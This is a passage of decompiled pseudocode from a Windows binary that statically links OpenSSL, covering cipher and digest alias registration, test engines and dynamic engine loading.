  sub_44B920((int)"cast-cbc", 32770, (int)"CAST5-CBC");
  v43 = (unsigned int *)sub_402D60();
  sub_430C70(v43);
  v44 = (unsigned int *)sub_402D40();
  sub_430C70(v44);
  v45 = (unsigned int *)sub_402DA0();
  sub_430C70(v45);
  v46 = (unsigned int *)sub_402DC0();
  sub_430C70(v46);
  v47 = (unsigned int *)sub_402DE0();
  sub_430C70(v47);
  v48 = (unsigned int *)sub_402D80();
  sub_430C70(v48);
  v49 = (unsigned int *)sub_402E00();
  sub_430C70(v49);
  v50 = (unsigned int *)sub_403920();
  sub_430C70(v50);
  v51 = (unsigned int *)sub_404E10();
  sub_430C70(v51);
  v52 = (unsigned int *)sub_403C50();
  sub_430C70(v52);
  v53 = (unsigned int *)sub_4044D0();
  sub_430C70(v53);
  v54 = (unsigned int *)sub_404730();
  sub_430C70(v54);
  sub_44B920((int)"aes128-wrap", 32770, (int)"id-aes128-wrap");
  v55 = (unsigned int *)sub_404760();
  sub_430C70(v55);
  sub_44B920((int)"AES128", 32770, (int)"AES-128-CBC");
  sub_44B920((int)"aes128", 32770, (int)"AES-128-CBC");
  v56 = (unsigned int *)sub_402E40();
  sub_430C70(v56);
  v57 = (unsigned int *)sub_402E20();
  sub_430C70(v57);
  v58 = (unsigned int *)sub_402E80();
  sub_430C70(v58);
  v59 = (unsigned int *)sub_402EA0();
  sub_430C70(v59);
  v60 = (unsigned int *)sub_402EC0();
  sub_430C70(v60);
  v61 = (unsigned int *)sub_402E60();
  sub_430C70(v61);
  v62 = (unsigned int *)sub_402EE0();
  sub_430C70(v62);
  v63 = (unsigned int *)sub_403940();
  sub_430C70(v63);
  v64 = (unsigned int *)sub_404E30();
  sub_430C70(v64);
  v65 = (unsigned int *)sub_4044F0();
  sub_430C70(v65);
  v66 = (unsigned int *)sub_404740();
  sub_430C70(v66);
  sub_44B920((int)"aes192-wrap", 32770, (int)"id-aes192-wrap");
  v67 = (unsigned int *)sub_404770();
  sub_430C70(v67);
  sub_44B920((int)"AES192", 32770, (int)"AES-192-CBC");
  sub_44B920((int)"aes192", 32770, (int)"AES-192-CBC");
  v68 = (unsigned int *)sub_402F20();
  sub_430C70(v68);
  v69 = (unsigned int *)sub_402F00();
  sub_430C70(v69);
  v70 = (unsigned int *)sub_402F60();
  sub_430C70(v70);
  v71 = (unsigned int *)sub_402F80();
  sub_430C70(v71);
  v72 = (unsigned int *)sub_402FA0();
  sub_430C70(v72);
  v73 = (unsigned int *)sub_402F40();
  sub_430C70(v73);
  v74 = (unsigned int *)sub_402FC0();
  sub_430C70(v74);
  v75 = (unsigned int *)sub_403960();
  sub_430C70(v75);
  v76 = (unsigned int *)sub_404E50();
  sub_430C70(v76);
  v77 = (unsigned int *)sub_403C70();
  sub_430C70(v77);
  v78 = (unsigned int *)sub_404510();
  sub_430C70(v78);
  v79 = (unsigned int *)sub_404750();
  sub_430C70(v79);
  sub_44B920((int)"aes256-wrap", 32770, (int)"id-aes256-wrap");
  v80 = (unsigned int *)sub_404780();
  sub_430C70(v80);
  sub_44B920((int)"AES256", 32770, (int)"AES-256-CBC");
  sub_44B920((int)"aes256", 32770, (int)"AES-256-CBC");
  v81 = (unsigned int *)sub_43C2A0();
  sub_430C70(v81);
  v82 = (unsigned int *)sub_43C2A0();
  sub_430C70(v82);
  v83 = (unsigned int *)sub_43C2A0();
  sub_430C70(v83);
  v84 = (unsigned int *)sub_43C2A0();
  sub_430C70(v84);
  v85 = (unsigned int *)sub_45D8D0();
  sub_430C70(v85);
  v86 = (unsigned int *)sub_45D8C0();
  sub_430C70(v86);
  v87 = (unsigned int *)sub_45D8F0();
  sub_430C70(v87);
  v88 = (unsigned int *)sub_45D900();
  sub_430C70(v88);
  v89 = (unsigned int *)sub_45D910();
  sub_430C70(v89);
  v90 = (unsigned int *)sub_45D8E0();
  sub_430C70(v90);
  sub_44B920((int)"CAMELLIA128", 32770, (int)"CAMELLIA-128-CBC");
  sub_44B920((int)"camellia128", 32770, (int)"CAMELLIA-128-CBC");
  v91 = (unsigned int *)sub_45D940();
  sub_430C70(v91);
  v92 = (unsigned int *)sub_45D930();
  sub_430C70(v92);
  v93 = (unsigned int *)sub_45D960();
  sub_430C70(v93);
  v94 = (unsigned int *)sub_45D970();
  sub_430C70(v94);
  v95 = (unsigned int *)sub_45D980();
  sub_430C70(v95);
  v96 = (unsigned int *)sub_45D950();
  sub_430C70(v96);
  sub_44B920((int)"CAMELLIA192", 32770, (int)"CAMELLIA-192-CBC");
  sub_44B920((int)"camellia192", 32770, (int)"CAMELLIA-192-CBC");
  v97 = (unsigned int *)sub_45D9B0();
  sub_430C70(v97);
  v98 = (unsigned int *)sub_45D9A0();
  sub_430C70(v98);
  v99 = (unsigned int *)sub_45D9D0();
  sub_430C70(v99);
  v100 = (unsigned int *)sub_45D9E0();
  sub_430C70(v100);
  v101 = (unsigned int *)sub_45D9F0();
  sub_430C70(v101);
  v102 = (unsigned int *)sub_45D9C0();
  sub_430C70(v102);
  sub_44B920((int)"CAMELLIA256", 32770, (int)"CAMELLIA-256-CBC");
  sub_44B920((int)"camellia256", 32770, (int)"CAMELLIA-256-CBC");
  v103 = (unsigned int *)sub_45D920();
  sub_430C70(v103);
  v104 = (unsigned int *)sub_45D990();
  sub_430C70(v104);
  v105 = (unsigned int *)sub_45DA00();
  sub_430C70(v105);
  v106 = (unsigned int *)sub_45CB50();
  sub_430C70(v106);
  v107 = (unsigned int *)sub_45D330();
  return sub_430C70(v107);
}

//----- (0043B820) --------------------------------------------------------
int sub_43B820()
{
  unsigned int *v0; // eax
  unsigned int *v1; // eax
  unsigned int *v2; // eax
  unsigned int *v3; // eax
  unsigned int *v4; // eax
  unsigned int *v5; // eax
  unsigned int *v6; // eax
  unsigned int *v7; // eax
  unsigned int *v8; // eax
  unsigned int *v9; // eax
  unsigned int *v10; // eax
  unsigned int *v11; // eax
  unsigned int *v12; // eax

  v0 = (unsigned int *)sub_4606C0();
  sub_430CC0(v0);
  v1 = (unsigned int *)sub_4303E0();
  sub_430CC0(v1);
  sub_44B920((int)"ssl3-md5", 32769, (int)"MD5");
  v2 = (unsigned int *)sub_460660();
  sub_430CC0(v2);
  v3 = (unsigned int *)sub_42BEA0();
  sub_430CC0(v3);
  sub_44B920((int)"ssl3-sha1", 32769, (int)"SHA1");
  sub_44B920((int)"RSA-SHA1-2", 32769, (int)"RSA-SHA1");
  v4 = (unsigned int *)sub_460410();
  sub_430CC0(v4);
  v5 = (unsigned int *)sub_460390();
  sub_430CC0(v5);
  sub_44B920((int)"ripemd", 32769, (int)"RIPEMD160");
  sub_44B920((int)"rmd160", 32769, (int)"RIPEMD160");
  v6 = (unsigned int *)sub_42BF40();
  sub_430CC0(v6);
  v7 = (unsigned int *)sub_42BF50();
  sub_430CC0(v7);
  v8 = (unsigned int *)sub_42BFF0();
  sub_430CC0(v8);
  v9 = (unsigned int *)sub_42C000();
  sub_430CC0(v9);
  v10 = (unsigned int *)sub_460330();
  sub_430CC0(v10);
  v11 = (unsigned int *)sub_4602B0();
  sub_430CC0(v11);
  v12 = (unsigned int *)sub_460230();
  return sub_430CC0(v12);
}

//----- (0043B920) --------------------------------------------------------
int __cdecl sub_43B920(char *a1)
{
  int result; // eax

  if ( !dword_5390B0 )
  {
    sub_4606F0();
    sub_4606D0();
    sub_408400();
    result = sub_441630(0, a1, 48);
    dword_5390B0 = 1;
  }
  return result;
}
// 5390B0: using guessed type int dword_5390B0;

//----- (0043B960) --------------------------------------------------------
void sub_43B960()
{
  dword_5390B0 = 1;
}
// 5390B0: using guessed type int dword_5390B0;

//----- (0043B970) --------------------------------------------------------
int __cdecl sub_43B970(int a1, void *Src)
{
  FILE *v2; // eax
  void *v3; // eax
  int v4; // eax
  int v6; // [esp-8h] [ebp-Ch]
  int v7; // [esp-4h] [ebp-8h]
  int v8; // [esp-4h] [ebp-8h]

  v2 = (FILE *)sub_4DA3E6();
  fprintf(v2 + 2, "(TEST_ENG_OPENSSL_RC4) test_init_key() called\n");
  v7 = sub_407470(a1);
  v3 = (void *)sub_4073F0(a1);
  memcpy(v3, Src, v7);
  v8 = sub_4073F0(a1);
  v6 = sub_407470(a1);
  v4 = sub_4073F0(a1);
  sub_460A60((_DWORD *)(v4 + 16), v6, v8);
  return 1;
}

//----- (0043B9E0) --------------------------------------------------------
int __cdecl sub_43B9E0(int a1, int a2, __m64 *a3, int a4)
{
  int v4; // eax

  v4 = sub_4073F0(a1);
  sub_460740(v4 + 16, a4, a3, a2);
  return 1;
}

//----- (0043BA10) --------------------------------------------------------
int sub_43BA10()
{
  int result; // eax
  _DWORD *v1; // eax
  void *v2; // esi

  result = dword_5390B4;
  if ( !dword_5390B4 )
  {
    v1 = sub_460C00(5, 1, 16);
    v2 = v1;
    if ( !v1
      || !sub_461FD0((int)v1, 0)
      || !sub_407520((int)v2, 8)
      || !sub_407540((int)v2, (int)sub_43B970)
      || !sub_407560((int)v2, (int)sub_43B9E0)
      || !sub_444000((int)v2, 1048) )
    {
      sub_460C30(v2);
      v2 = 0;
    }
    result = (int)v2;
    dword_5390B4 = (int)v2;
  }
  return result;
}
// 5390B4: using guessed type int dword_5390B4;

//----- (0043BAA0) --------------------------------------------------------
int sub_43BAA0()
{
  int result; // eax
  _DWORD *v1; // eax
  void *v2; // esi

  result = dword_5390B8;
  if ( !dword_5390B8 )
  {
    v1 = sub_460C00(5, 1, 5);
    v2 = v1;
    if ( !v1
      || !sub_461FD0((int)v1, 0)
      || !sub_407520((int)v2, 8)
      || !sub_407540((int)v2, (int)sub_43B970)
      || !sub_407560((int)v2, (int)sub_43B9E0)
      || !sub_444000((int)v2, 1048) )
    {
      sub_460C30(v2);
      v2 = 0;
    }
    result = (int)v2;
    dword_5390B8 = (int)v2;
  }
  return result;
}
// 5390B8: using guessed type int dword_5390B8;

//----- (0043BB30) --------------------------------------------------------
int __usercall sub_43BB30@<eax>(_DWORD *a1@<esi>)
{
  int v1; // eax
  int v2; // eax
  int v3; // ecx
  int v4; // eax
  int v5; // eax
  int v6; // ecx
  int v7; // ecx
  int result; // eax

  if ( dword_5390D0 )
  {
    result = dword_5390CC;
    *a1 = dword_5390BC;
  }
  else
  {
    v1 = sub_43BA10();
    if ( v1 )
    {
      v2 = sub_435D30(v1);
      v3 = dword_5390CC;
      dword_5390BC[dword_5390CC] = v2;
      dword_5390CC = v3 + 1;
    }
    v4 = sub_43BAA0();
    if ( v4 )
    {
      v5 = sub_435D30(v4);
      v6 = dword_5390CC;
      dword_5390BC[dword_5390CC] = v5;
      v7 = v6 + 1;
      dword_5390CC = v7;
    }
    else
    {
      v7 = dword_5390CC;
    }
    dword_5390BC[v7] = 0;
    dword_5390D0 = 1;
    result = v7;
    *a1 = dword_5390BC;
  }
  return result;
}
// 5390BC: using guessed type int dword_5390BC[4];
// 5390CC: using guessed type int dword_5390CC;
// 5390D0: using guessed type int dword_5390D0;

//----- (0043BBC0) --------------------------------------------------------
int __cdecl sub_43BBC0(int a1, int *a2, _DWORD *a3, int a4)
{
  if ( !a2 )
    return sub_43BB30(a3);
  if ( a4 == 5 )
  {
    *a2 = sub_43BA10();
    return 1;
  }
  else if ( a4 == 97 )
  {
    *a2 = sub_43BAA0();
    return 1;
  }
  else
  {
    *a2 = 0;
    return 0;
  }
}

//----- (0043BC10) --------------------------------------------------------
int sub_43BC10()
{
  int result; // eax
  _DWORD *v1; // eax
  void *v2; // esi

  result = dword_5390D4;
  if ( !dword_5390D4 )
  {
    v1 = sub_4074B0(64, 65);
    v2 = v1;
    if ( !v1
      || !sub_4177A0((int)v1, 20)
      || !sub_460C50((int)v2, 64)
      || !sub_407500((int)v2, 100)
      || !sub_461FD0((int)v2, 0)
      || !sub_407520((int)v2, (int)sub_42BCD0)
      || !sub_407540((int)v2, (int)sub_42BCF0)
      || !sub_407560((int)v2, (int)sub_42BD20) )
    {
      sub_4074E0(v2);
      v2 = 0;
    }
    result = (int)v2;
    dword_5390D4 = (int)v2;
  }
  return result;
}
// 5390D4: using guessed type int dword_5390D4;

//----- (0043BCC0) --------------------------------------------------------
int __usercall sub_43BCC0@<eax>(_DWORD *a1@<esi>)
{
  int v1; // eax
  int v2; // eax
  int v3; // ecx
  int v4; // ecx
  int result; // eax

  if ( dword_5390E4 )
  {
    result = dword_5390E0;
    *a1 = dword_5390D8;
  }
  else
  {
    v1 = sub_43BC10();
    if ( v1 )
    {
      v2 = sub_435D30(v1);
      v3 = dword_5390E0;
      dword_5390D8[dword_5390E0] = v2;
      v4 = v3 + 1;
      dword_5390E0 = v4;
    }
    else
    {
      v4 = dword_5390E0;
    }
    dword_5390D8[v4] = 0;
    dword_5390E4 = 1;
    result = v4;
    *a1 = dword_5390D8;
  }
  return result;
}
// 5390D8: using guessed type int dword_5390D8[];
// 5390E0: using guessed type int dword_5390E0;
// 5390E4: using guessed type int dword_5390E4;

//----- (0043BD30) --------------------------------------------------------
int __cdecl sub_43BD30(int a1, int *a2, _DWORD *a3, int a4)
{
  if ( !a2 )
    return sub_43BCC0(a3);
  if ( a4 == 64 )
  {
    *a2 = sub_43BC10();
    return 1;
  }
  else
  {
    *a2 = 0;
    return 0;
  }
}

//----- (0043BD70) --------------------------------------------------------
volatile LONG *__cdecl sub_43BD70(int a1, LPCCH lpMultiByteStr)
{
  FILE *v2; // eax
  volatile LONG *result; // eax
  volatile LONG *v4; // esi
  volatile LONG *v5; // edi

  v2 = (FILE *)sub_4DA3E6();
  fprintf(v2 + 2, "(TEST_ENG_OPENSSL_PKEY)Loading Private key %s\n", lpMultiByteStr);
  result = sub_4196B0(lpMultiByteStr, "r");
  v4 = result;
  if ( result )
  {
    v5 = sub_41CFE0(result, 0, 0, 0);
    sub_404F50(v4);
    return v5;
  }
  return result;
}

//----- (0043BE10) --------------------------------------------------------
BOOL __usercall sub_43BE10@<eax>(_DWORD *a1@<esi>)
{
  char **v1; // eax
  char **v2; // eax
  char **v3; // eax
  char **v4; // eax
  void **v5; // eax
  BOOL result; // eax

  result = 0;
  if ( sub_42A0F0(a1, (int)off_531470[0]) )
  {
    if ( sub_42A130((int)a1, (int)off_531474) )
    {
      if ( sub_461FF0((int)a1, (int)sub_43BDC0) )
      {
        v1 = sub_405610();
        if ( sub_4177A0((int)a1, (int)v1) )
        {
          v2 = sub_41D5F0();
          if ( sub_461FD0((int)a1, (int)v2) )
          {
            v3 = sub_4359F0();
            if ( sub_407540((int)a1, (int)v3) )
            {
              v4 = sub_4346A0();
              if ( sub_407520((int)a1, (int)v4) )
              {
                v5 = sub_419B40();
                if ( sub_407560((int)a1, (int)v5) )
                {
                  if ( sub_461EF0((int)a1, (int)sub_43BBC0)
                    && sub_444000((int)a1, (int)sub_43BD30)
                    && sub_460C70((int)a1, (int)sub_43BD70) )
                  {
                    return 1;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 43BDC0: using guessed type int sub_43BDC0();
// 531470: using guessed type char *off_531470[2];
// 531474: using guessed type char *off_531474;

//----- (0043BF00) --------------------------------------------------------
volatile LONG *sub_43BF00()
{
  volatile LONG *result; // eax
  volatile LONG *v1; // esi

  result = (volatile LONG *)sub_42A240();
  v1 = result;
  if ( result )
  {
    if ( sub_43BE10(result) )
    {
      sub_42B560(v1);
      sub_429F60(v1);
      return (volatile LONG *)sub_408400();
    }
    else
    {
      return (volatile LONG *)sub_429F60(v1);
    }
  }
  return result;
}

//----- (0043BF40) --------------------------------------------------------
int __cdecl sub_43BF40(int *a1, int Src)
{
  signed int i; // esi
  int v4; // eax

  for ( i = Src; i >= 4; ++a1 )
  {
    v4 = sub_413B90();
    if ( !v4 )
      return 0;
    *a1 = v4;
    i -= 4;
  }
  if ( !i )
    return 1;
  Src = sub_413B90();
  if ( Src )
  {
    memcpy(a1, &Src, i);
    return 1;
  }
  return 0;
}

//----- (0043BFA0) --------------------------------------------------------
BOOL __usercall sub_43BFA0@<eax>(_DWORD *a1@<esi>)
{
  return sub_42A0F0(a1, (int)off_531490[0])
      && sub_42A130((int)a1, (int)off_531494[0])
      && sub_42A1D0((int)a1, 8)
      && sub_42A170((int)a1, (int)sub_44F720)
      && sub_407560((int)a1, (int)&unk_531478);
}
// 531490: using guessed type char *off_531490[4];
// 531494: using guessed type char *off_531494[3];

//----- (0043C010) --------------------------------------------------------
void sub_43C010()
{
  volatile LONG *v0; // esi

  if ( (dword_73C6D4 & 0x40000000) != 0 )
  {
    v0 = (volatile LONG *)sub_42A240();
    if ( v0 )
    {
      if ( sub_43BFA0(v0) )
      {
        sub_42B560(v0);
        sub_429F60(v0);
        sub_408400();
      }
      else
      {
        sub_429F60(v0);
      }
    }
  }
}
// 73C6D4: using guessed type int dword_73C6D4;

//----- (0043C050) --------------------------------------------------------
void __cdecl sub_43C050(void *Block)
{
  sub_413490(Block);
}

//----- (0043C070) --------------------------------------------------------
void __cdecl sub_43C070(int a1, void *Block)
{
  if ( Block )
  {
    sub_460CB0(*(volatile LONG **)Block);
    sub_413490(*((void **)Block + 3));
    sub_413490(*((void **)Block + 5));
    sub_426C00(*((void **)Block + 10), (void (__cdecl *)(_DWORD))sub_43C050);
    sub_413490(Block);
  }
}

//----- (0043C0D0) --------------------------------------------------------
int __usercall sub_43C0D0@<eax>(int a1@<ebx>, int *a2)
{
  void *v2; // esi
  int v3; // edi
  _DWORD *v5; // eax
  int v6; // eax

  v2 = sub_413430(0x2Cu);
  v3 = 1;
  if ( v2 )
  {
    v5 = sub_426AF0();
    *((_DWORD *)v2 + 10) = v5;
    if ( v5 )
    {
      *((_DWORD *)v2 + 7) = "v_check";
      *((_DWORD *)v2 + 8) = "bind_engine";
      *((_DWORD *)v2 + 9) = 1;
      sub_414690(dword_73C6C0);
      v6 = sub_42A0E0(a1, dword_5314A0);
      *a2 = v6;
      if ( !v6 )
      {
        v3 = sub_42A0D0(a1, dword_5314A0, (int)v2);
        if ( v3 )
        {
          *a2 = (int)v2;
          v2 = 0;
        }
      }
      sub_4146B0(dword_73C6C0);
      if ( v2 )
        sub_4269F0(*((void ***)v2 + 10));
      sub_413490(v2);
      return v3;
    }
    else
    {
      sub_408310(38, 183, 65, (int)"crypto\\engine\\eng_dyn.c", 165);
      sub_413490(v2);
      return 0;
    }
  }
  else
  {
    sub_408310(38, 183, 65, (int)"crypto\\engine\\eng_dyn.c", 160);
    return 0;
  }
}
// 5314A0: using guessed type int dword_5314A0;

//----- (0043C1E0) --------------------------------------------------------
int __thiscall sub_43C1E0(void *this)
{
  int v2; // esi
  int result; // eax
  int v4; // [esp+8h] [ebp-4h] BYREF

  if ( dword_5314A0 < 0 )
  {
    v2 = sub_4149D0(0xAu, 0, 0, 0, 0, (int)sub_43C070);
    if ( v2 == -1 )
    {
      sub_408310(38, 181, 144, (int)"crypto\\engine\\eng_dyn.c", 210);
      return 0;
    }
    sub_414690(dword_73C6C0);
    if ( dword_5314A0 < 0 )
      dword_5314A0 = v2;
    sub_4146B0(dword_73C6C0);
  }
  result = sub_42A0E0((int)this, dword_5314A0);
  v4 = result;
  if ( !result )
  {
    if ( !sub_43C0D0((int)this, &v4) )
      return 0;
    return v4;
  }
  return result;
}
// 5314A0: using guessed type int dword_5314A0;

//----- (0043C2A0) --------------------------------------------------------
int sub_43C2A0()
{
  return 0;
}

//----- (0043C2B0) --------------------------------------------------------
int __usercall sub_43C2B0@<eax>(int a1@<esi>)
{
  int v2; // ebp
  int v3; // ebx
  int v4; // eax
  const char *v5; // eax
  char *v6; // edi

  if ( *(_DWORD *)(a1 + 36) != 2 && sub_461170(*(volatile LONG **)a1, *(const char **)(a1 + 12), 0, 0) )
    return 1;
  if ( !*(_DWORD *)(a1 + 36) )
    return 0;
  v2 = sub_426A30(*(_DWORD *)(a1 + 40));
  if ( v2 < 1 )
    return 0;
  v3 = 0;
  while ( 1 )
  {
    v4 = sub_426A40(*(int **)(a1 + 40), v3);
    v5 = (const char *)sub_460F60(*(_DWORD *)a1, *(_DWORD *)(a1 + 12), v4);
    v6 = (char *)v5;
    if ( !v5 )
      return 0;
    if ( sub_461170(*(volatile LONG **)a1, v5, 0, 0) )
      break;
    sub_413490(v6);
    if ( ++v3 >= v2 )
      return 0;
  }
  sub_413490(v6);
  return 1;
}
// 43C2F7: conditional instruction was optimized away because eax.4>=1

//----- (0043C380) --------------------------------------------------------
int __usercall sub_43C380@<eax>(int a1@<ebx>, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v4; // eax
  int (__cdecl *v5)(int); // eax
  __int16 v6; // [esp-14h] [ebp-8Ch]
  int v7; // [esp-Ch] [ebp-84h]
  volatile LONG *v8; // [esp-Ch] [ebp-84h]
  volatile LONG *v9; // [esp-8h] [ebp-80h]
  volatile LONG *v10; // [esp-8h] [ebp-80h]
  void *v11; // [esp+4h] [ebp-74h] BYREF
  int v12; // [esp+8h] [ebp-70h] BYREF
  int v13; // [esp+Ch] [ebp-6Ch] BYREF
  int v14; // [esp+10h] [ebp-68h] BYREF
  char v15[100]; // [esp+14h] [ebp-64h] BYREF

  if ( !*(_DWORD *)a1 )
  {
    v2 = sub_461160();
    *(_DWORD *)a1 = v2;
    if ( !v2 )
      return 0;
  }
  if ( !*(_DWORD *)(a1 + 12) )
  {
    if ( !*(_DWORD *)(a1 + 20) )
      return 0;
    sub_460E10(*(_DWORD **)a1, 2, 2, 0);
    *(_DWORD *)(a1 + 12) = sub_460FC0(*(_DWORD *)a1, *(const char **)(a1 + 20));
  }
  if ( !sub_43C2B0(a1) )
  {
    sub_408310(38, 182, 132, (int)"crypto\\engine\\eng_dyn.c", 414);
    sub_460CB0(*(volatile LONG **)a1);
    *(_DWORD *)a1 = 0;
    return 0;
  }
  v4 = sub_460D90(*(_DWORD *)a1, *(_DWORD *)(a1 + 32));
  *(_DWORD *)(a1 + 8) = v4;
  if ( !v4 )
  {
    v9 = *(volatile LONG **)a1;
    *(_DWORD *)(a1 + 8) = 0;
    sub_460CB0(v9);
    v7 = 427;
    v6 = 104;
LABEL_15:
    *(_DWORD *)a1 = 0;
    sub_408310(38, 182, v6, (int)"crypto\\engine\\eng_dyn.c", v7);
    return 0;
  }
  if ( !*(_DWORD *)(a1 + 16) )
  {
    v5 = (int (__cdecl *)(int))sub_460D90(*(_DWORD *)a1, *(_DWORD *)(a1 + 28));
    *(_DWORD *)(a1 + 4) = v5;
    if ( !v5 || (unsigned int)v5(196608) < 0x30000 )
    {
      v10 = *(volatile LONG **)a1;
      *(_DWORD *)(a1 + 8) = 0;
      *(_DWORD *)(a1 + 4) = 0;
      sub_460CB0(v10);
      v7 = 454;
      v6 = 145;
      goto LABEL_15;
    }
  }
  qmemcpy(v15, a2, sizeof(v15));
  v11 = sub_42A210();
  sub_4133B0(&v12, &v13, &v14);
  sub_429EA0(a2);
  if ( !(*(int (__cdecl **)(_DWORD *, _DWORD, void **))(a1 + 8))(a2, *(_DWORD *)(a1 + 20), &v11) )
  {
    v8 = *(volatile LONG **)a1;
    *(_DWORD *)(a1 + 8) = 0;
    *(_DWORD *)(a1 + 4) = 0;
    sub_460CB0(v8);
    *(_DWORD *)a1 = 0;
    sub_408310(38, 182, 109, (int)"crypto\\engine\\eng_dyn.c", 485);
    qmemcpy(a2, v15, 0x64u);
    return 0;
  }
  if ( *(int *)(a1 + 24) > 0 && !sub_42B560(a2) )
  {
    if ( *(int *)(a1 + 24) > 1 )
    {
      sub_408310(38, 182, 103, (int)"crypto\\engine\\eng_dyn.c", 502);
      return 0;
    }
    sub_408400();
  }
  return 1;
}

//----- (0043C580) --------------------------------------------------------
int __cdecl sub_43C580(_DWORD *a1, int a2, unsigned int a3, const char *Src)
{
  _DWORD *v4; // eax
  _DWORD *v5; // edi
  const char *v6; // esi
  int result; // eax
  const char *v8; // esi
  void *v9; // eax
  void *v10; // esi

  v4 = (_DWORD *)sub_43C1E0(a1);
  v5 = v4;
  if ( !v4 )
  {
    sub_408310(38, 180, 112, (int)"crypto\\engine\\eng_dyn.c", 295);
    return 0;
  }
  if ( *v4 )
  {
    sub_408310(38, 180, 100, (int)"crypto\\engine\\eng_dyn.c", 301);
    return 0;
  }
  switch ( a2 )
  {
    case 200:
      v6 = Src;
      if ( Src && !strlen(Src) )
        v6 = 0;
      sub_413490((void *)v5[3]);
      if ( v6 )
      {
        v5[3] = sub_4247B0(v6);
        return v5[3] != 0;
      }
      else
      {
        v5[3] = 0;
        return 0;
      }
    case 201:
      v4[4] = a3 != 0;
      goto LABEL_13;
    case 202:
      v8 = Src;
      if ( Src && !strlen(Src) )
        v8 = 0;
      sub_413490((void *)v5[5]);
      if ( v8 )
      {
        v5[5] = sub_4247B0(v8);
        return v5[5] != 0;
      }
      else
      {
        v5[5] = 0;
        return 0;
      }
    case 203:
      if ( a3 <= 2 )
      {
        v4[6] = a3;
        return 1;
      }
      sub_408310(38, 180, 143, (int)"crypto\\engine\\eng_dyn.c", 330);
      return 0;
    case 204:
      if ( a3 <= 2 )
      {
        v4[9] = a3;
        return 1;
      }
      sub_408310(38, 180, 143, (int)"crypto\\engine\\eng_dyn.c", 339);
      return 0;
    case 205:
      if ( !Src || !strlen(Src) )
      {
        sub_408310(38, 180, 143, (int)"crypto\\engine\\eng_dyn.c", 347);
        return 0;
      }
      v9 = sub_4247B0(Src);
      v10 = v9;
      if ( !v9 )
      {
        sub_408310(38, 180, 65, (int)"crypto\\engine\\eng_dyn.c", 353);
        return 0;
      }
      if ( sub_4269B0((int *)v5[10], (int)v9) )
      {
LABEL_13:
        result = 1;
      }
      else
      {
        sub_413490(v10);
        sub_408310(38, 180, 65, (int)"crypto\\engine\\eng_dyn.c", 358);
        result = 0;
      }
      break;
    case 206:
      return sub_43C380((int)v4, a1);
    default:
      sub_408310(38, 180, 119, (int)"crypto\\engine\\eng_dyn.c", 366);
      return 0;
  }
  return result;
}

//----- (0043C800) --------------------------------------------------------
volatile LONG *sub_43C800()
{
  volatile LONG *v0; // esi

  v0 = (volatile LONG *)sub_42A240();
  if ( v0 )
  {
    if ( sub_42A0F0(v0, (int)off_531498[0])
      && sub_42A130((int)v0, (int)off_53149C)
      && sub_42A170((int)v0, (int)sub_43C2A0)
      && sub_42A190((int)v0, (int)sub_43C2A0)
      && sub_42A1B0((int)v0, (int)sub_43C580)
      && sub_42A1D0((int)v0, 4)
      && sub_42A1F0((int)v0, (int)&unk_50BB78) )
    {
      return v0;
    }
    sub_429F60(v0);
  }
  return 0;
}
// 531498: using guessed type char *off_531498[2];
// 53149C: using guessed type char *off_53149C;

//----- (0043C8A0) --------------------------------------------------------
volatile LONG *sub_43C8A0()
{
  volatile LONG *result; // eax
  volatile LONG *v1; // esi

  result = sub_43C800();
  v1 = result;
  if ( result )
  {
    sub_42B560(result);
    sub_429F60(v1);
    return (volatile LONG *)sub_408400();
  }
  return result;
}

//----- (0043C8D0) --------------------------------------------------------
BOOL sub_43C8D0()
{
  return dword_539150 || dword_53914C;
}
// 53914C: using guessed type int dword_53914C;
// 539150: using guessed type int dword_539150;

//----- (0043C8F0) --------------------------------------------------------
void __cdecl sub_43C8F0(int a1, char *a2, char *a3, char a4)
{
  int v4; // esi
  int v5; // eax

  v4 = -sub_4073F0(a1) & 0xF;
  v5 = sub_4073F0(a1);
  sub_4613B0(a2, a3, v4 + v5, a4);
}

//----- (0043C930) --------------------------------------------------------
void __cdecl sub_43C930(int C, char *a2, char *a3, char a4)
{
  int v4; // edi
  _DWORD *v5; // esi
  _DWORD *v6; // eax
  int v7; // eax
  _DWORD *v8; // eax

  v4 = -sub_4073F0(C) & 0xF;
  v5 = (_DWORD *)(v4 + sub_4073F0(C));
  v6 = (_DWORD *)_tolower(C);
  *v5 = *v6;
  v5[1] = v6[1];
  v5[2] = v6[2];
  v5[3] = v6[3];
  sub_4615D0(a2, a3, (int)v5, a4);
  if ( v7 )
  {
    v8 = (_DWORD *)_tolower(C);
    *v8 = *v5;
    v8[1] = v5[1];
    v8[2] = v5[2];
    v8[3] = v5[3];
  }
}
// 43C986: variable 'v7' is possibly undefined

//----- (0043CBA0) --------------------------------------------------------
int __cdecl sub_43CBA0(int C, char *a2, _BYTE *a3, int a4)
{
  int v4; // esi
  _DWORD *v5; // edi
  unsigned int v6; // esi
  int v7; // eax
  _BYTE *v9; // ebp
  char *v10; // ebx
  _DWORD *v11; // eax
  unsigned int v12; // esi
  int v13; // eax
  char *v14; // ebx
  _BYTE *v15; // ebp
  bool v16; // zf
  _DWORD *v17; // eax
  _BYTE *v18; // [esp+10h] [ebp-4h]

  v4 = -sub_4073F0(C) & 0xF;
  v5 = (_DWORD *)(v4 + sub_4073F0(C));
  v6 = sub_407450(C);
  if ( v6 )
  {
    v7 = _tolower(C);
    if ( v6 >= 0x10 )
      return 0;
    v9 = a3;
    v10 = a2;
    do
    {
      if ( !a4 )
        break;
      --a4;
      *v10++ = *v9++ ^ *(_BYTE *)(v7 + v6++);
    }
    while ( v6 < 0x10 );
    sub_407460(C, v6 & 0xF);
  }
  else
  {
    v9 = a3;
    v10 = a2;
  }
  if ( a4 )
  {
    v11 = (_DWORD *)_tolower(C);
    *v5 = *v11;
    v5[1] = v11[1];
    v5[2] = v11[2];
    v12 = a4 & 0xFFFFFFF0;
    v5[3] = v11[3];
    if ( (a4 & 0xFFFFFFF0) != 0 )
    {
      sub_461960(v10, (int)v9, (int)v5, v12);
      if ( !v13 )
        return 0;
      a4 -= v12;
    }
    if ( a4 )
    {
      v18 = v5;
      v14 = &v10[v12];
      v15 = &v9[v12];
      sub_407460(C, a4);
      sub_461370();
      sub_461380();
      sub_461370();
      do
      {
        *v14++ = *v18 ^ *v15++;
        v16 = a4-- == 1;
        ++v18;
      }
      while ( !v16 );
    }
    v17 = (_DWORD *)_tolower(C);
    *v17 = *v5;
    v17[1] = v5[1];
